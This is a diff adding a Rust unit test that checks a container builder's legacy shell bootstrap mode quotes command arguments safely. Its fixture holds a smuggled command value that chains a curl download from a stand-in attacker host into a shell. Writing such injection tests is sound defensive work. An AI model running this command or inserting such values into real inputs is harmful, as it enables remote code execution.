@@ -154,6 +154,30 @@ fn app_container_uses_tcp_readiness_without_liveness() {
     assert!(readiness.http_get.is_none());
 }
 
+
+#[test]
+fn app_container_legacy_shell_escapes_signed_command_args() {
+    unsafe { std::env::set_var("LEGACY_BOOTSTRAP_SCRIPT", "true") };
+
+    let mut app = sample_app();
+    app.containers[0].command = Some(vec![
+        "true; curl attacker/sh | sh".to_string(),
+        "arg with spaces".to_string(),
+        "single'quote".to_string(),
+    ]);
+
+    let c = build_app_container(&app);
+    let cmd = c.command.as_ref().unwrap();
+    assert_eq!(cmd[0], "/bin/sh");
+    assert_eq!(cmd[1], "-c");
+    let rendered = &cmd[2];
+    assert!(rendered.contains("/secure-pv/bootstrap.sh -- 'true; curl attacker/sh | sh'"));
+    assert!(rendered.contains("'arg with spaces'"));
+    assert!(rendered.contains("'single'\"'\"'quote'"));
+
+    unsafe { std::env::remove_var("LEGACY_BOOTSTRAP_SCRIPT") };
+}
+
 // === Attestation proxy ===
 
 #[test]
